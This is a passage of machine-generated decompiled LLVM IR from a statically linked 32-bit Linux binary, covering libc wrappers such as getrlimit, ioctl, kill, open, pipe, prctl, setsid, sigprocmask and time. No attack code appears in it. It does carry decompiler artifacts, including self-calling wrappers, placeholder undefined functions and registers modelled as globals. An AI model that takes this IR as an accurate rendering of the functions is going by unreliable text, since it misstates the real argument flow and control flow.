  %v2_804dd68 = call i32 @getcwd(i32 %v0_804dd68, i32 %tmp13)
  %v0_804dd6a = load i32, i32* @ebx, align 4
  store i32 %v0_804dd6a, i32* @edx, align 4
  store i32 %v2_804dd68, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_804dd68, -4095
  br i1 %tmp, label %dec_label_pc_804dd80, label %dec_label_pc_804dd75

dec_label_pc_804dd75:                             ; preds = %dec_label_pc_804dd5d
  %v0_804dd75 = load i32, i32* %stack_var_-44, align 4
  %v1_804dd75 = call i32 @__errno_location(i32 %v0_804dd75)
  %v0_804dd7a = load i32, i32* @ebx, align 4
  %v1_804dd7a = sub i32 0, %v0_804dd7a
  store i32 %v1_804dd7a, i32* @ebx, align 4
  %v2_804dd7c = inttoptr i32 %v1_804dd75 to i32*
  store i32 %v1_804dd7a, i32* %v2_804dd7c, align 4
  br label %dec_label_pc_804dda2

dec_label_pc_804dd80:                             ; preds = %dec_label_pc_804dd5d
  %v2_804dd80 = icmp slt i32 %v2_804dd68, 0
  br i1 %v2_804dd80, label %dec_label_pc_804dda2, label %dec_label_pc_804dd84

dec_label_pc_804dd84:                             ; preds = %dec_label_pc_804dd80
  %v0_804dd84 = load i32, i32* @edi, align 4
  %v1_804dd84 = icmp eq i32 %v0_804dd84, 0
  %v1_804dd86 = icmp eq i1 %v1_804dd84, false
  br i1 %v1_804dd86, label %dec_label_pc_804ddb6, label %dec_label_pc_804dd88

dec_label_pc_804dd88:                             ; preds = %dec_label_pc_804dd84
  br i1 %v1_804dd19, label %dec_label_pc_804dd9e, label %dec_label_pc_804dd8c

dec_label_pc_804dd8c:                             ; preds = %dec_label_pc_804dd88
  %v0_804dd8f = load i32, i32* @esi, align 4
  store i32 %v0_804dd8f, i32* %stack_var_-44, align 4
  %v4_804dd90 = inttoptr i32 %v0_804dd8f to i32*
  %v5_804dd90 = call i32 @realloc(i32* %v4_804dd90, i32 %v2_804dd68, i32 %v0_804dd6a, i32 %v0_804dd6a)
  %v1_804dd98 = icmp eq i32 %v5_804dd90, 0
  %v1_804dd9c = icmp eq i1 %v1_804dd98, false
  br i1 %v1_804dd9c, label %dec_label_pc_804ddb6, label %dec_label_pc_804dd9e

dec_label_pc_804dd9e:                             ; preds = %dec_label_pc_804dd8c, %dec_label_pc_804dd88
  %v0_804dd9e = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ddb6

dec_label_pc_804dda2:                             ; preds = %dec_label_pc_804dd80, %dec_label_pc_804dd75
  %v0_804dda2 = load i32, i32* @edi, align 4
  %v1_804dda2 = icmp eq i32 %v0_804dda2, 0
  %v1_804dda4 = icmp eq i1 %v1_804dda2, false
  br i1 %v1_804dda4, label %dec_label_pc_804ddb4, label %dec_label_pc_804dda6

dec_label_pc_804dda6:                             ; preds = %dec_label_pc_804dda2
  %v0_804dda9 = load i32, i32* @esi, align 4
  store i32 %v0_804dda9, i32* %stack_var_-44, align 4
  %v1_804ddaa = call i32 @free(i32 %v0_804dda9)
  %v0_804ddb9.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ddb6

dec_label_pc_804ddb4:                             ; preds = %dec_label_pc_804dda2, %dec_label_pc_804dd4b, %dec_label_pc_804dd1f
  br label %dec_label_pc_804ddb6

dec_label_pc_804ddb6:                             ; preds = %dec_label_pc_804dd8c, %dec_label_pc_804dd84, %dec_label_pc_804dda6, %dec_label_pc_804dd9e, %dec_label_pc_804ddb4
  %v0_804ddb9 = phi i32 [ %v5_804dd90, %dec_label_pc_804dd8c ], [ %v0_804dd84, %dec_label_pc_804dd84 ], [ %v0_804ddb9.pre, %dec_label_pc_804dda6 ], [ %v0_804dd9e, %dec_label_pc_804dd9e ], [ 0, %dec_label_pc_804ddb4 ]
  %v0_804ddb6 = load i32, i32* @esp, align 4
  %v5_804ddb6 = icmp ugt i32 %v0_804ddb6, -13
  store i1 %v5_804ddb6, i1* @cf, align 1
  store i32 %v0_804dd0b, i32* @ebx, align 4
  store i32 %v0_804dd0a, i32* @esi, align 4
  store i32 %v0_804dd09, i32* @edi, align 4
  store i32 %v0_804dd08, i32* @ebp, align 4
  ret i32 %v0_804ddb9

; uselistorder directives
  uselistorder i32 %v2_804dd68, { 1, 3, 0, 2 }
  uselistorder i32 %v0_804dd4e, { 1, 0 }
  uselistorder i32 %v3_804dd2f, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i1* @cf, { 0, 4, 1, 2, 3 }
  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ddb6, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804ddc3 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804ddca = call i32 @getrlimit(i32 7, i32 %v2_804ddc3)
  store i32 256, i32* @edx, align 4
  %v2_804ddd7 = icmp slt i32 %v2_804ddca, 0
  br i1 %v2_804ddd7, label %dec_label_pc_804dddf, label %dec_label_pc_804dddb

dec_label_pc_804dddb:                             ; preds = %entry
  %v3_804dddb = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804dddb, i32* @edx, align 4
  br label %dec_label_pc_804dddf

dec_label_pc_804dddf:                             ; preds = %entry, %dec_label_pc_804dddb
  %v0_804dddf = phi i32 [ 256, %entry ], [ %v3_804dddb, %dec_label_pc_804dddb ]
  ret i32 %v0_804dddf

; uselistorder directives
  uselistorder label %dec_label_pc_804dddf, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804dde8 = load i32, i32* @global_var_80602d0.151, align 16
  store i32 %v0_804dde8, i32* @edx, align 4
  %v1_804ddf3 = icmp eq i32 %v0_804dde8, 0
  %v1_804ddf5 = icmp eq i1 %v1_804ddf3, false
  %v4_804ddf5 = select i1 %v1_804ddf5, i32 %v0_804dde8, i32 4096
  ret i32 %v4_804ddf5
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ddfc = load i32, i32* @ebx, align 4
  store i32 %v0_804ddfc, i32* %stack_var_-4, align 4
  %v1_804de05 = call i32 @getpid(i32 %v0_804ddfc)
  store i32 %v1_804de05, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804de05, -4095
  br i1 %tmp, label %dec_label_pc_804de1c, label %dec_label_pc_804de10

dec_label_pc_804de10:                             ; preds = %entry
  %v0_804de10 = load i32, i32* %stack_var_-4, align 4
  %v1_804de10 = call i32 @__errno_location(i32 %v0_804de10)
  %v0_804de15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de15 = sub i32 0, %v0_804de15
  %v2_804de17 = inttoptr i32 %v1_804de10 to i32*
  store i32 %v1_804de15, i32* %v2_804de17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de1c

dec_label_pc_804de1c:                             ; preds = %entry, %dec_label_pc_804de10
  %v0_804de1d = phi i32 [ %v1_804de05, %entry ], [ -1, %dec_label_pc_804de10 ]
  %v2_804de20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de20, i32* @ebx, align 4
  ret i32 %v0_804de1d

; uselistorder directives
  uselistorder i32 %v1_804de05, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de1c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de24 = load i32, i32* @ebx, align 4
  store i32 %v0_804de24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804de37 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804de37, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804de37, -4095
  br i1 %tmp, label %dec_label_pc_804de50, label %dec_label_pc_804de44

dec_label_pc_804de44:                             ; preds = %entry
  %v0_804de44 = load i32, i32* %stack_var_-4, align 4
  %v1_804de44 = call i32 @__errno_location(i32 %v0_804de44)
  %v0_804de49 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804de49 = sub i32 0, %v0_804de49
  %v2_804de4b = inttoptr i32 %v1_804de44 to i32*
  store i32 %v1_804de49, i32* %v2_804de4b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %entry, %dec_label_pc_804de44
  %v0_804de51 = phi i32 [ %v1_804de37, %entry ], [ -1, %dec_label_pc_804de44 ]
  %v2_804de54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de54, i32* @ebx, align 4
  ret i32 %v0_804de51

; uselistorder directives
  uselistorder i32 %v1_804de37, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de50, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804de58 = load i32, i32* @edi, align 4
  store i32 %v0_804de58, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804de70 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804de78 = call i32 @ioctl(i32 %v0_804de70, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804de70, i32* @ebx, align 4
  store i32 %v3_804de78, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804de78, -4095
  br i1 %tmp, label %dec_label_pc_804de90, label %dec_label_pc_804de84

dec_label_pc_804de84:                             ; preds = %entry
  %v1_804de84 = call i32 @__errno_location(i32 %v0_804de70)
  %v0_804de89 = load i32, i32* %edi.global-to-local, align 4
  %v1_804de89 = sub i32 0, %v0_804de89
  %v2_804de8b = inttoptr i32 %v1_804de84 to i32*
  store i32 %v1_804de89, i32* %v2_804de8b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804de90

dec_label_pc_804de90:                             ; preds = %entry, %dec_label_pc_804de84
  %v0_804de93 = phi i32 [ %v3_804de78, %entry ], [ -1, %dec_label_pc_804de84 ]
  %v2_804de95 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804de95, i32* @edi, align 4
  ret i32 %v0_804de93

; uselistorder directives
  uselistorder i32 %v3_804de78, { 1, 0, 2 }
  uselistorder i32 %v0_804de70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de90, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804de98 = load i32, i32* @ebx, align 4
  store i32 %v0_804de98, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804deab = call i32 @kill(i32 %v0_804de98, i32 %tmp4)
  store i32 %v2_804deab, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804deab, -4095
  br i1 %tmp, label %dec_label_pc_804dec4, label %dec_label_pc_804deb8

dec_label_pc_804deb8:                             ; preds = %entry
  %v0_804deb8 = load i32, i32* %stack_var_-4, align 4
  %v1_804deb8 = call i32 @__errno_location(i32 %v0_804deb8)
  %v0_804debd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804debd = sub i32 0, %v0_804debd
  %v2_804debf = inttoptr i32 %v1_804deb8 to i32*
  store i32 %v1_804debd, i32* %v2_804debf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dec4

dec_label_pc_804dec4:                             ; preds = %entry, %dec_label_pc_804deb8
  %v0_804dec5 = phi i32 [ %v2_804deab, %entry ], [ -1, %dec_label_pc_804deb8 ]
  %v2_804dec4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dec4, i32* @edx, align 4
  %v2_804dec8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dec8, i32* @ebx, align 4
  ret i32 %v0_804dec5

; uselistorder directives
  uselistorder i32 %v2_804deab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dec4, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804decf = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804ded3 = sdiv i32 %sext, 16777216
  store i32 %v4_804ded3, i32* @ecx, align 4
  %v4_804ded7 = ptrtoint i8* %arg1 to i32
  %v3_804dedb = and i32 %arg2, 64
  %v4_804dedb = icmp eq i32 %v3_804dedb, 0
  br i1 %v4_804dedb, label %dec_label_pc_804deec, label %dec_label_pc_804dee0

dec_label_pc_804dee0:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804deec

dec_label_pc_804deec:                             ; preds = %entry, %dec_label_pc_804dee0
  %v0_804deec = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804dee0 ]
  store i32 %v0_804deec, i32* @edx, align 4
  store i32 %v4_804ded7, i32* %ebx.global-to-local, align 4
  %v5_804def7 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804ded3)
  store i32 %v5_804def7, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804def7, -4095
  br i1 %tmp15, label %dec_label_pc_804df0f, label %dec_label_pc_804df03

dec_label_pc_804df03:                             ; preds = %dec_label_pc_804deec
  %v1_804df03 = call i32 @__errno_location(i32 %v0_804decf)
  %v0_804df08 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804df08 = sub i32 0, %v0_804df08
  %v2_804df0a = inttoptr i32 %v1_804df03 to i32*
  store i32 %v1_804df08, i32* %v2_804df0a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804df0f

dec_label_pc_804df0f:                             ; preds = %dec_label_pc_804deec, %dec_label_pc_804df03
  %v0_804df12 = phi i32 [ %v5_804def7, %dec_label_pc_804deec ], [ -1, %dec_label_pc_804df03 ]
  store i32 %v0_804decf, i32* @ebx, align 4
  ret i32 %v0_804df12

; uselistorder directives
  uselistorder i32 %v5_804def7, { 1, 0, 2 }
  uselistorder i32 %v4_804ded3, { 1, 0 }
  uselistorder i32 %v0_804decf, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804df0f, { 1, 0 }
  uselistorder label %dec_label_pc_804deec, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804df27 = inttoptr i32 %arg1 to i8*
  %v4_804df27 = call i32 @__libc_open(i8* %v3_804df27, i32 577)
  ret i32 %v4_804df27
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804df30 = load i32, i32* @edi, align 4
  store i32 %v0_804df30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804df38 = load i32, i32* @ebx, align 4
  %v1_804df40 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804df40 = call i32 @pipe([2 x i32] %v1_804df40)
  store i32 %v0_804df38, i32* @ebx, align 4
  store i32 %v2_804df40, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804df40, -4095
  br i1 %tmp, label %dec_label_pc_804df58, label %dec_label_pc_804df4c

dec_label_pc_804df4c:                             ; preds = %entry
  %v1_804df4c = call i32 @__errno_location(i32 %v0_804df38)
  %v0_804df51 = load i32, i32* %edi.global-to-local, align 4
  %v1_804df51 = sub i32 0, %v0_804df51
  %v2_804df53 = inttoptr i32 %v1_804df4c to i32*
  store i32 %v1_804df51, i32* %v2_804df53, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804df58

dec_label_pc_804df58:                             ; preds = %entry, %dec_label_pc_804df4c
  %v0_804df59 = phi i32 [ %v2_804df40, %entry ], [ -1, %dec_label_pc_804df4c ]
  %v2_804df5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804df5c, i32* @edi, align 4
  ret i32 %v0_804df59

; uselistorder directives
  uselistorder i32 %v2_804df40, { 1, 0, 2 }
  uselistorder i32 %v0_804df38, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df58, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804df60 = load i32, i32* @edi, align 4
  %v0_804df61 = load i32, i32* @esi, align 4
  store i32 %v0_804df61, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804df79 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804df81 = call i32 @prctl(i32 %v0_804df79, i32 %v0_804df61, i32 %v0_804df60, i32 %tmp6, i32 %arg1)
  store i32 %v0_804df79, i32* @ebx, align 4
  store i32 %v5_804df81, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804df81, -4095
  br i1 %tmp, label %dec_label_pc_804df99, label %dec_label_pc_804df8d

dec_label_pc_804df8d:                             ; preds = %entry
  %v1_804df8d = call i32 @__errno_location(i32 %v0_804df79)
  %v0_804df92 = load i32, i32* %esi.global-to-local, align 4
  %v1_804df92 = sub i32 0, %v0_804df92
  %v2_804df94 = inttoptr i32 %v1_804df8d to i32*
  store i32 %v1_804df92, i32* %v2_804df94, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804df99

dec_label_pc_804df99:                             ; preds = %entry, %dec_label_pc_804df8d
  %v0_804df9a = phi i32 [ %v5_804df81, %entry ], [ -1, %dec_label_pc_804df8d ]
  %v2_804df9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804df9c, i32* @esi, align 4
  store i32 %v0_804df60, i32* @edi, align 4
  ret i32 %v0_804df9a

; uselistorder directives
  uselistorder i32 %v5_804df81, { 1, 0, 2 }
  uselistorder i32 %v0_804df79, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804df99, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dfa0 = load i32, i32* @edi, align 4
  store i32 %v0_804dfa0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dfb0 = load i32, i32* @ebx, align 4
  %v4_804dfb8 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804dfb0, i32* @ebx, align 4
  store i32 %v4_804dfb8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804dfb8, -4095
  br i1 %tmp, label %dec_label_pc_804dfd0, label %dec_label_pc_804dfc4

dec_label_pc_804dfc4:                             ; preds = %entry
  %v1_804dfc4 = call i32 @__errno_location(i32 %v0_804dfb0)
  %v0_804dfc9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dfc9 = sub i32 0, %v0_804dfc9
  %v2_804dfcb = inttoptr i32 %v1_804dfc4 to i32*
  store i32 %v1_804dfc9, i32* %v2_804dfcb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dfd0

dec_label_pc_804dfd0:                             ; preds = %entry, %dec_label_pc_804dfc4
  %v0_804dfd1 = phi i32 [ %v4_804dfb8, %entry ], [ -1, %dec_label_pc_804dfc4 ]
  %v2_804dfd4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dfd4, i32* @edi, align 4
  ret i32 %v0_804dfd1

; uselistorder directives
  uselistorder i32 %v4_804dfb8, { 1, 0, 2 }
  uselistorder i32 %v0_804dfb0, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804dfd9 = load i32, i32* @esi, align 4
  store i32 %v0_804dfd9, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804dff1 = load i32, i32* @ebx, align 4
  %v1_804dff9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804dff1, i32* @ebx, align 4
  store i32 %v1_804dff9, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804dff9, -4095
  br i1 %tmp, label %dec_label_pc_804e011, label %dec_label_pc_804e005

dec_label_pc_804e005:                             ; preds = %entry
  %v1_804e005 = call i32 @__errno_location(i32 %v0_804dff1)
  %v0_804e00a = load i32, i32* %esi.global-to-local, align 4
  %v1_804e00a = sub i32 0, %v0_804e00a
  %v2_804e00c = inttoptr i32 %v1_804e005 to i32*
  store i32 %v1_804e00a, i32* %v2_804e00c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e011

dec_label_pc_804e011:                             ; preds = %entry, %dec_label_pc_804e005
  %v0_804e012 = phi i32 [ %v1_804dff9, %entry ], [ -1, %dec_label_pc_804e005 ]
  %v2_804e011 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e011, i32* @edx, align 4
  %v2_804e014 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e014, i32* @esi, align 4
  ret i32 %v0_804e012

; uselistorder directives
  uselistorder i32 %v1_804dff9, { 1, 0, 2 }
  uselistorder i32 %v0_804dff1, { 1, 0 }
  uselistorder label %dec_label_pc_804e011, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e018 = load i32, i32* @ebx, align 4
  store i32 %v0_804e018, i32* %stack_var_-4, align 4
  %v1_804e021 = call i32 @setsid(i32 %v0_804e018)
  store i32 %v1_804e021, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e021, -4095
  br i1 %tmp, label %dec_label_pc_804e038, label %dec_label_pc_804e02c

dec_label_pc_804e02c:                             ; preds = %entry
  %v0_804e02c = load i32, i32* %stack_var_-4, align 4
  %v1_804e02c = call i32 @__errno_location(i32 %v0_804e02c)
  %v0_804e031 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e031 = sub i32 0, %v0_804e031
  %v2_804e033 = inttoptr i32 %v1_804e02c to i32*
  store i32 %v1_804e031, i32* %v2_804e033, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %entry, %dec_label_pc_804e02c
  %v0_804e039 = phi i32 [ %v1_804e021, %entry ], [ -1, %dec_label_pc_804e02c ]
  %v2_804e03c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e03c, i32* @ebx, align 4
  ret i32 %v0_804e039

; uselistorder directives
  uselistorder i32 %v1_804e021, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e038, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804e041 = load i32, i32* @esi, align 4
  %v4_804e045 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e045, i32* @ecx, align 4
  %v2_804e051 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804e051, label %dec_label_pc_804e06a, label %dec_label_pc_804e055

dec_label_pc_804e055:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804e06a, label %dec_label_pc_804e05a

dec_label_pc_804e05a:                             ; preds = %dec_label_pc_804e055
  %v1_804e05a = call i32 @__errno_location(i32 %v0_804e041)
  %v1_804e05f = inttoptr i32 %v1_804e05a to i32*
  store i32 22, i32* %v1_804e05f, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_804e091

dec_label_pc_804e06a:                             ; preds = %dec_label_pc_804e055, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e06f = load i32, i32* @ebx, align 4
  %v7_804e077 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e06f, i32* @ebx, align 4
  %v1_804e07a = add i32 %v7_804e077, 4096
  %v2_804e07a = icmp ult i32 %v7_804e077, -4096
  %v3_804e07a = xor i32 %v7_804e077, -2147483648
  %v4_804e07a = xor i32 %v1_804e07a, %v7_804e077
  %v5_804e07a = and i32 %v4_804e07a, %v3_804e07a
  %v6_804e07a = icmp slt i32 %v5_804e07a, 0
  store i1 %v6_804e07a, i1* @of, align 1
  %v7_804e07a = icmp eq i32 %v1_804e07a, 0
  store i32 %v7_804e077, i32* %esi.global-to-local, align 4
  %v2_804e081 = or i1 %v2_804e07a, %v7_804e07a
  br i1 %v2_804e081, label %dec_label_pc_804e091, label %dec_label_pc_804e083

dec_label_pc_804e083:                             ; preds = %dec_label_pc_804e06a
  %v1_804e083 = call i32 @__errno_location(i32 %v0_804e06f)
  %v0_804e088 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e088 = sub i32 0, %v0_804e088
  %v2_804e08a = inttoptr i32 %v1_804e083 to i32*
  store i32 %v1_804e088, i32* %v2_804e08a, align 4
  store i1 false, i1* @of, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e091

dec_label_pc_804e091:                             ; preds = %dec_label_pc_804e083, %dec_label_pc_804e06a, %dec_label_pc_804e05a
  %storemerge = phi i32 [ -1, %dec_label_pc_804e05a ], [ %v7_804e077, %dec_label_pc_804e06a ], [ -1, %dec_label_pc_804e083 ]
  %v2_804e091 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e091, i32* @edx, align 4
  store i32 %v0_804e041, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804e07a, { 1, 0 }
  uselistorder i32 %v7_804e077, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_804e06f, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e098 = load i32, i32* @edi, align 4
  store i32 %v0_804e098, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e0a0 = load i32, i32* @ebx, align 4
  %v2_804e0a8 = call i32 @time(i32* %arg1)
  store i32 %v0_804e0a0, i32* @ebx, align 4
  store i32 %v2_804e0a8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e0a8, -4095
  br i1 %tmp, label %dec_label_pc_804e0c0, label %dec_label_pc_804e0b4

dec_label_pc_804e0b4:                             ; preds = %entry
  %v1_804e0b4 = call i32 @__errno_location(i32 %v0_804e0a0)
  %v0_804e0b9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e0b9 = sub i32 0, %v0_804e0b9
  %v2_804e0bb = inttoptr i32 %v1_804e0b4 to i32*
  store i32 %v1_804e0b9, i32* %v2_804e0bb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e0c0

dec_label_pc_804e0c0:                             ; preds = %entry, %dec_label_pc_804e0b4
  %v0_804e0c1 = phi i32 [ %v2_804e0a8, %entry ], [ -1, %dec_label_pc_804e0b4 ]
  %v2_804e0c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e0c0, i32* @edx, align 4
  %v2_804e0c4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e0c4, i32* @edi, align 4
  ret i32 %v0_804e0c1

; uselistorder directives
  uselistorder i32 %v2_804e0a8, { 1, 0, 2 }
  uselistorder i32 %v0_804e0a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e0c0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
